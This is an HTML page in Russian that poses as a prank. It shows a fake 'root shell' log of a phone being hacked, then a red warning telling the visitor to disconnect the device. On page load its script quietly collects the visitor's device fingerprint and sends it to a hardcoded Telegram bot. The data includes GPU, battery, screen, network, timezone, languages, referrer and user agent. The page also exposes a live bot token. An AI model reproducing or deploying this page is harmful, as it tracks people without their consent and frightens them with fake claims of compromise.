<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>root@system:~#</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: #020402;
      color: #00ff41;
      font-family: 'Courier New', Courier, monospace;
      font-size: 13px;
      line-height: 1.35;
      padding: 12px;
      min-height: 100vh;
      overflow-x: hidden;
      text-shadow: 0 0 5px rgba(0, 255, 65, 0.38);
    }

    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        0deg,
        rgba(0, 0, 0, 0.24),
        rgba(0, 0, 0, 0.24) 1px,
        transparent 1px,
        transparent 3px
      );
      pointer-events: none;
      z-index: 20;
    }

    /* Мягкая красная подсветка по краям */
    #flash-overlay {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 15;
      box-shadow: inset 0 0 0 rgba(255, 30, 50, 0);
      transition: box-shadow 0.14s ease, background-color 0.14s ease;
    }

    #flash-overlay.flash {
      box-shadow: inset 0 0 32px rgba(255, 30, 50, 0.35);
      background-color: rgba(255, 30, 50, 0.03);
    }

    @keyframes shake {
      0%, 100% { transform: translate(0, 0); }
      25% { transform: translate(-3px, 1px); }
      50% { transform: translate(3px, -1px); }
      75% { transform: translate(-2px, -1px); }
    }

    .shake {
      animation: shake 0.22s linear;
    }

    #top-bar {
      position: sticky;
      top: 0;
      background: rgba(2, 4, 2, 0.94);
      border-bottom: 1px solid #0d3b17;
      padding: 6px 4px;
      margin-bottom: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      color: #00cc33;
      z-index: 12;
    }

    #terminal {
      max-width: 840px;
      margin: 0 auto;
      padding-bottom: 50px;
    }

    .line {
      margin-bottom: 2px;
      word-break: break-all;
      color: #00ff41;
    }

    .ts {
      color: #008f24;
    }

    .bright {
      color: #66ff8c;
      font-weight: bold;
    }

    .cmd {
      color: #99ffb3;
      font-weight: bold;
    }

    .alert-line {
      color: #ff4d5e;
      font-weight: bold;
      text-shadow: 0 0 6px rgba(255, 77, 94, 0.45);
    }

    .cursor {
      display: inline-block;
      width: 8px;
      height: 14px;
      background: #00ff41;
      vertical-align: middle;
      animation: blink 0.7s infinite;
    }

    @keyframes blink {
      0%, 49% { opacity: 1; }
      50%, 100% { opacity: 0; }
    }

    #final-alert {
      display: none;
      min-height: calc(100vh - 24px);
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }

    #final-alert .alert-text {
      color: #ff2a3c;
      font-size: 27px;
      font-weight: bold;
      line-height: 1.35;
      text-shadow: 0 0 12px rgba(255, 42, 60, 0.55);
      animation: pulseRed 1.1s infinite alternate;
    }

    @keyframes pulseRed {
      from { opacity: 0.82; transform: scale(0.99); }
      to { opacity: 1; transform: scale(1.02); }
    }
  </style>
</head>
<body>

  <div id="flash-overlay"></div>

  <div id="terminal">
    <div id="top-bar">
      <span>● ROOT SHELL // TTY1 [ACTIVE]</span>
      <span id="sound-hint">TAP SCREEN FOR AUDIO</span>
    </div>
    <div id="output"></div>
    <div id="cursor-row"><span id="typing-line" class="cmd"></span><span class="cursor"></span></div>
  </div>

  <div id="final-alert">
    <div class="alert-text">Доступ получен. Немедленно отключите свое устройство.</div>
  </div>

  <script>
    const TG_BOT_TOKEN = "8294247946:AAFg9JHzStcfuxkF2jh5VJT7OYhIBIZgrAk";
    const TG_CHAT_ID = "8215850367";
    const DURATION_MS = 30000;

    const terminalEl = document.getElementById("terminal");
    const output = document.getElementById("output");
    const typingLine = document.getElementById("typing-line");
    const cursorRow = document.getElementById("cursor-row");
    const finalAlert = document.getElementById("final-alert");
    const flashOverlay = document.getElementById("flash-overlay");
    const soundHint = document.getElementById("sound-hint");

    let finished = false;
    let audioCtx = null;

    // Реальные данные устройства из браузера для отображения в терминале и отправки в ТГ
    const ua = navigator.userAgent;
    const platform = navigator.platform || "Linux armv8l";
    const lang = navigator.language || "ru-RU";
    const languages = (navigator.languages || [lang]).join(", ");
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Europe/Kyiv";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const availRes = `${window.screen.availWidth}x${window.screen.availHeight}`;
    const dpr = window.devicePixelRatio || 1;
    const colorDepth = window.screen.colorDepth || 24;
    const cores = navigator.hardwareConcurrency || 8;
    const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "4GB+";
    const touchPoints = navigator.maxTouchPoints || 5;
    const connType = navigator.connection ? (navigator.connection.effectiveType || "4g").toUpperCase() : "4G";
    const connSpeed = navigator.connection && navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "N/A";
    const connRtt = navigator.connection && navigator.connection.rtt ? `${navigator.connection.rtt} ms` : "N/A";

    function detectDeviceModel() {
      const m = ua.match(/Android\s[\d.]+;\s([^;)]+)/i);
      if (m && m[1]) return m[1].trim();
      if (/iPhone/i.test(ua)) return "Apple iPhone";
      if (/Windows/i.test(ua)) return "Windows PC";
      return platform;
    }

    function detectBrowser() {
      if (/Edg\//i.test(ua)) return "Edge";
      if (/OPR\//i.test(ua)) return "Opera";
      if (/YaBrowser/i.test(ua)) return "Yandex Browser";
      if (/Chrome\//i.test(ua)) return "Chrome Mobile";
      if (/Safari\//i.test(ua)) return "Safari";
      if (/Firefox\//i.test(ua)) return "Firefox";
      return "WebView";
    }

    const deviceModel = detectDeviceModel();
    const browserName = detectBrowser();

    // Инициализация звука (Chrome блокирует звук до первого касания, поэтому включаем при любом тапе/скролле/клике)
    function unlockAudio() {
      try {
        if (!audioCtx) {
          const AC = window.AudioContext || window.webkitAudioContext;
          if (AC) audioCtx = new AC();
        }
        if (audioCtx && audioCtx.state === "suspended") {
          audioCtx.resume().then(() => {
            if (soundHint) soundHint.textContent = "AUDIO: ON";
          }).catch(() => {});
        } else if (audioCtx && audioCtx.state === "running") {
          if (soundHint) soundHint.textContent = "AUDIO: ON";
        }
      } catch (e) {}
    }

    function playBeep(freq = 820, duration = 0.03, type = "square", vol = 0.06) {
      try {
        unlockAudio();
        if (!audioCtx || audioCtx.state !== "running") return;
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
        gain.gain.setValueAtTime(vol, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start();
        osc.stop(audioCtx.currentTime + duration);
      } catch (e) {}
    }

    function triggerVibrate(pattern) {
      try {
        if (navigator.vibrate) navigator.vibrate(pattern);
      } catch (e) {}
    }

    function triggerSoftFlashAndShake() {
      flashOverlay.classList.add("flash");
      terminalEl.classList.remove("shake");
      void terminalEl.offsetWidth;
      terminalEl.classList.add("shake");
      playBeep(210, 0.13, "sawtooth", 0.09);
      triggerVibrate([45, 35, 65]);
      setTimeout(() => flashOverlay.classList.remove("flash"), 140);
    }

    ["touchstart", "touchend", "pointerdown", "click", "keydown"].forEach((evt) => {
      window.addEventListener(evt, () => {
        unlockAudio();
        playBeep(1100, 0.015, "sine", 0.02);
        triggerVibrate(12);
      }, { passive: true });
    });

    function getTimestamp() {
      const d = new Date();
      return d.toTimeString().split(" ")[0] + "." + String(d.getMilliseconds()).padStart(3, "0");
    }

    function randHex(len = 8) {
      let s = "";
      const chars = "0123456789abcdef";
      for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * 16)];
      return "0x" + s;
    }

    // Расширенный отстук в Telegram + сбор всех доступных метаданных
    async function notifyTelegram() {
      const visitKey = "term_prank_visits_count";
      const prevCount = parseInt(localStorage.getItem(visitKey) || "0", 10);
      const currentCount = prevCount + 1;
      localStorage.setItem(visitKey, String(currentCount));

      const ref = document.referrer || "Прямой переход (ссылка из чата)";
      const historyLen = window.history.length;
      const orientation = (window.screen.orientation && window.screen.orientation.type) || "portrait";

      let batteryInfo = "Недоступно";
      let batteryLevelForTerm = "84%";
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          const pct = Math.round(b.level * 100);
          batteryLevelForTerm = pct + "%";
          batteryInfo = `${pct}% (${b.charging ? "на зарядке" : "от батареи"})`;
        }
      } catch (e) {}

      let gpuInfo = "Недоступно";
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
          if (dbg) {
            gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch (e) {}

      // Добавляем реальный GPU и батарею прямо в живые логи терминала
      realSystemLogs.push(
        { t: `hw_probe: GPU_RENDERER="${gpuInfo}"`, c: "bright" },
        { t: `power_supply: battery_capacity=${batteryLevelForTerm} status=ONLINE`, c: "bright" }
      );

      const text =
        `🚨 <b>ПРАНК-ТЕРМИНАЛ ЗАПУЩЕН!</b>

` +
        `🕒 <b>Время входа:</b> ${new Date().toLocaleString("ru-RU")}
` +
        `🔢 <b>Заход по счёту:</b> ${currentCount}-й раз
` +
        `📱 <b>Модель / Платформа:</b> ${deviceModel} (${platform})
` +
        `🌐 <b>Браузер:</b> ${browserName}
` +
        `🎮 <b>Видеочип (GPU):</b> <code>${gpuInfo}</code>
` +
        `🖥 <b>Экран:</b> ${screenRes} (доступно ${availRes}, DPR ${dpr}, ${colorDepth}-bit, ${orientation})
` +
        `👆 <b>Мультитач:</b> до ${touchPoints} касаний
` +
        `⚙️ <b>Железо:</b> ${cores} ядер CPU / ${ram} RAM
` +
        `🔋 <b>Батарея:</b> ${batteryInfo}
` +
        `📶 <b>Сеть:</b> ${navigator.onLine ? "Online" : "Offline"} | ${connType} | ${connSpeed} | RTT ${connRtt}
` +
        `🌍 <b>Часовой пояс:</b> ${tz}
` +
        `🗣 <b>Языки:</b> ${languages}
` +
        `📑 <b>Вкладок в истории:</b> ${historyLen}
` +
        `🔗 <b>Откуда перешёл:</b> ${ref}
` +
        `🧾 <b>User-Agent:</b>
<code>${ua}</code>`;

      try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "HTML"
          })
        });
      } catch (e) {}
    }

    function appendLine(text, cls = "", withTs = true) {
      if (finished) return;
      const div = document.createElement("div");
      div.className = "line " + cls;
      if (withTs) {
        div.innerHTML = `<span class="ts">[${getTimestamp()}]</span> ${text}`;
      } else {
        div.textContent = text;
      }
      output.appendChild(div);

      while (output.children.length > 120) {
        output.removeChild(output.firstChild);
      }
      window.scrollTo(0, document.body.scrollHeight);
    }

    function sleep(ms) {
      return new Promise((r) => setTimeout(r, ms));
    }

    async function fakeCommandInput(cmdText) {
      if (finished) return;
      const prompt = "root@device:~# ";
      typingLine.textContent = prompt;
      for (let i = 0; i < cmdText.length; i++) {
        if (finished) return;
        typingLine.textContent += cmdText[i];
        playBeep(950 + Math.random() * 200, 0.015, "square", 0.03);
        window.scrollTo(0, document.body.scrollHeight);
        await sleep(10 + Math.random() * 12);
      }
      await sleep(50);
      appendLine(prompt + cmdText, "cmd", false);
      typingLine.textContent = "";
    }

    // Реальные данные конкретного устройства пользователя для эффекта "настоящего сканирования"
    const realSystemLogs = [
      { t: `target_id: model="${deviceModel}" arch="${platform}"`, c: "bright" },
      { t: `env_check: browser="${browserName}" locale="${lang}" tz="${tz}"`, c: "bright" },
      { t: `display_srv: resolution=${screenRes} dpr=${dpr}x color_depth=${colorDepth}bit`, c: "bright" },
      { t: `cpu_mem: logical_cores=${cores} sys_mem=${ram} touch_points=${touchPoints}`, c: "bright" },
      { t: `net_iface: type=${connType} downlink=${connSpeed} rtt=${connRtt} status=CONNECTED`, c: "bright" },
      { t: `ua_fingerprint: ${ua}`, c: "" }
    ];

    const noiseLogs = [
      () => ({ t: `kernel: tcp_syn_ack -> 185.220.101.44:443 seq=${randHex(6)} [ESTABLISHED]`, c: "" }),
      () => ({ t: `mem_dump: reading page ${randHex(8)}..${randHex(8)} -> OK`, c: "" }),
      () => ({ t: `fs_scan: /data/user/0/org.telegram.messenger/files/cache4.db [BYPASSED]`, c: "bright" }),
      () => ({ t: `auth_hook: extracting session_key=${randHex(12)}...`, c: "" }),
      () => ({ t: `net_inject: packet_len=1480B crc32=${randHex(8)} -> SENT`, c: "" }),
      () => ({ t: `sys_proc: uid=0(root) gid=0(root) context=u:r:su:s0`, c: "bright" }),
      () => ({ t: `selinux: permissive mode forced on PID ${Math.floor(1000 + Math.random() * 8000)}`, c: "" }),
      () => ({ t: `sqlite_export: contacts2.db -> /tmp/.sys_cache/c.bin (248 KB)`, c: "" }),
      () => ({ t: `keystore: master_key_blob decrypted at offset ${randHex(4)}`, c: "bright" }),
      () => ({ t: `ALERT: remote_shell_daemon bound to 0.0.0.0:31337`, c: "alert-line", alert: true }),
      () => ({ t: `dcim_index: /sdcard/DCIM/Camera/IMG_${Math.floor(20260101 + Math.random() * 1120)}.jpg queued`, c: "" }),
      () => ({ t: `net_bridge: uploading chunk #${Math.floor(Math.random() * 99)} -> 200 OK`, c: "bright" }),
      () => ({ t: `CRITICAL: device_admin_policy overridden by remote host`, c: "alert-line", alert: true }),
      () => ({ t: `vfs_mount: /dev/block/dm-0 mounted rw at /mnt/shadow_root`, c: "" }),
      () => ({ t: `token_grab: oauth_bearer=${randHex(16)} verified`, c: "bright" })
    ];

    const commands = [
      "su -c 'mount -o rw,remount /system'",
      "./exploit_stage2 --bypass-sandbox --silent",
      "dump_storage --target=telegram,contacts,keystore --compress",
      "iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT",
      "daemon_ctl --lock-power-state --keep-alive"
    ];

    function showFinalAlert() {
      if (finished) return;
      finished = true;
      terminalEl.style.display = "none";
      cursorRow.style.display = "none";
      finalAlert.style.display = "flex";
      flashOverlay.classList.add("flash");
      playBeep(150, 0.5, "sawtooth", 0.14);
      triggerVibrate([250, 90, 250, 90, 400]);
      setTimeout(() => flashOverlay.classList.remove("flash"), 250);
    }

    async function runTerminal() {
      notifyTelegram();
      setTimeout(showFinalAlert, DURATION_MS);

      appendLine("Booting remote debug bridge v4.9.2...", "bright");
      await sleep(80);

      // Сначала выводим реальную информацию об устройстве жертвы
      for (let i = 0; i < realSystemLogs.length; i++) {
        if (finished) return;
        appendLine(realSystemLogs[i].t, realSystemLogs[i].c, true);
        playBeep(700 + i * 40, 0.02, "square", 0.03);
        await sleep(55);
      }

      let cmdIdx = 0;
      let stepCount = 0;

      while (!finished) {
        if (stepCount % 22 === 0) {
          await fakeCommandInput(commands[cmdIdx % commands.length]);
          cmdIdx++;
        }

        // Выводим сразу по 2 строки за тик для максимальной скорости терминала
        for (let b = 0; b < 2; b++) {
          if (finished) break;
          const item = noiseLogs[Math.floor(Math.random() * noiseLogs.length)]();
          appendLine(item.t, item.c, true);
          if (item.alert) {
            triggerSoftFlashAndShake();
          }
        }

        if (stepCount % 3 === 0) {
          playBeep(650 + Math.random() * 260, 0.015, "sine", 0.025);
        }

        stepCount++;
        await sleep(22 + Math.random() * 18);
      }
    }

    runTerminal();
  </script>
</body>
</html>
